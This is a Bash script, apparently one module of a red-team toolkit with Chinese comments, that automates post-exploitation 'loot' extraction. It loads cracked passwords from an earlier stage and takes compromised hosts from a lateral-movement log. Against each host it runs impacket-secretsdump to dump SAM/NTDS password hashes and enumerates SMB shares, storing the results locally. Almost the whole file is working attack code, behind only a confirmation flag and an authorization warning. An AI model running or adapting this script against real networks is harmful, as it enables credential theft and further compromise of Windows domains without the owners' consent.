#!/bin/bash
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
export USE_LATEST=true
source "$SCRIPT_DIR/config.sh"

# ========== 色彩 ==========
echo -e "${YELLOW}>>> [CatTeam 模块: 后渗透提取] 战利品提取 <<<${NC}"

# ========== 安全阀门 (必须 --confirm) ==========
if [[ "${1:-}" != "--confirm" ]]; then
    echo -e "${RED}╔══════════════════════════════════════════════════╗${NC}"
    echo -e "${RED}║  ⚠️  WARNING: 此模块将执行 secretsdump 提取凭据  ║${NC}"
    echo -e "${RED}║  这会触发强烈的 EDR/流量告警 (DCSync 检测)       ║${NC}"
    echo -e "${RED}║                                                  ║${NC}"
    echo -e "${RED}║  请确认你已获得授权并了解后果。                    ║${NC}"
    echo -e "${RED}║  用法: make loot CONFIRM=--confirm               ║${NC}"
    echo -e "${RED}╚══════════════════════════════════════════════════╝${NC}"
    exit 1
fi

# ========== 凭据获取 (OPSEC 安全协议) ==========
L_USER="${LATERAL_USER:-}"
L_PASS="${LATERAL_PASS:-}"
L_DOMAIN="${LATERAL_DOMAIN}"

if [ -z "$L_USER" ] || [ -z "$L_PASS" ]; then
    if [ -f "$LOOT_DIR/cracked_passwords.txt" ] && [ -s "$LOOT_DIR/cracked_passwords.txt" ]; then
        log "${CYAN}[~] 从 05 模块破解结果自动加载凭据...${NC}"
        FIRST_CRACKED=$(head -1 "$LOOT_DIR/cracked_passwords.txt")
        [ -z "$L_USER" ] && L_USER=$(echo "$FIRST_CRACKED" | cut -d: -f1)
        [ -z "$L_PASS" ] && L_PASS=$(echo "$FIRST_CRACKED" | awk -F: '{print $NF}')
    fi

    if [ -z "$L_USER" ]; then
        read -p "$(echo -e "${CYAN}输入用户名: ${NC}")" L_USER
    fi
    if [ -z "$L_PASS" ]; then
        read -s -p "$(echo -e "${CYAN}输入密码 (不回显): ${NC}")" L_PASS
        echo ""
    fi
fi

if [ -z "$L_USER" ] || [ -z "$L_PASS" ]; then
    log "${RED}[!] 凭据不完整，无法执行提取。${NC}"
    exit 1
fi

# ========== 读取沦陷目标 ==========
LATERAL_RESULTS="$LOOT_DIR/lateral_results.txt"
if [ ! -f "$LATERAL_RESULTS" ]; then
    log "${RED}[!] 未找到 lateral_results.txt，请先执行 make lateral${NC}"
    exit 1
fi

SUCCESS_IPS=$(grep '^\[SUCCESS\]' "$LATERAL_RESULTS" | grep -oE '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' || true)
if [ -z "$SUCCESS_IPS" ]; then
    log "${YELLOW}[!] 未发现沦陷主机 (没有 [SUCCESS] 记录)${NC}"
    exit 0
fi

SUCCESS_COUNT=$(echo "$SUCCESS_IPS" | wc -l | tr -d ' ')
log "${GREEN}[+] 发现 ${SUCCESS_COUNT} 台沦陷目标，开始提取...${NC}"

# ========== 确保战车就绪 ==========
docker start "$CONTAINER_NAME" > /dev/null 2>&1 || true

# ========== 提取循环 ==========
SECRETS_DIR="$LOOT_DIR/secrets"
mkdir -p "$SECRETS_DIR"

echo "$SUCCESS_IPS" | while read -r TARGET_IP; do
    [ -z "$TARGET_IP" ] && continue
    TARGET_DIR="$SECRETS_DIR/$TARGET_IP"
    mkdir -p "$TARGET_DIR"

    log "${CYAN}[~] === 提取目标: $TARGET_IP ===${NC}"

    # 1. SecretsDump — 提取 SAM/NTDS 哈希
    log "[-] 执行 secretsdump..."
    docker exec "$CONTAINER_NAME" bash -c \
        "impacket-secretsdump '${L_DOMAIN}/${L_USER}:${L_PASS}@${TARGET_IP}' 2>&1" \
        > "$TARGET_DIR/secretsdump.txt" 2>&1 || true

    if [ -s "$TARGET_DIR/secretsdump.txt" ]; then
        HASH_COUNT=$(grep -c ':::' "$TARGET_DIR/secretsdump.txt" 2>/dev/null || echo 0)
        log "${GREEN}[+] secretsdump 完成 → ${HASH_COUNT} 条哈希${NC}"
    else
        log "${YELLOW}[!] secretsdump 无输出${NC}"
    fi

    # 2. SMB 共享列举
    log "[-] 列举 SMB 共享目录..."
    docker exec "$CONTAINER_NAME" bash -c \
        "impacket-smbclient '${L_DOMAIN}/${L_USER}:${L_PASS}@${TARGET_IP}' -c 'shares' 2>&1" \
        > "$TARGET_DIR/smb_shares.txt" 2>&1 || true

    if [ -s "$TARGET_DIR/smb_shares.txt" ]; then
        log "${GREEN}[+] SMB 共享列举完成${NC}"
    fi

    log "${GREEN}[+] $TARGET_IP 提取结果 → $TARGET_DIR/${NC}"
done

# ========== 权限加固 ==========
chmod -R 600 "$SECRETS_DIR" 2>/dev/null || true

# ========== 汇总 ==========
log "${GREEN}[+] 战利品提取完毕！${NC}"
log "[-] 提取目录: $SECRETS_DIR/"
ls -la "$SECRETS_DIR/" 2>/dev/null | head -20
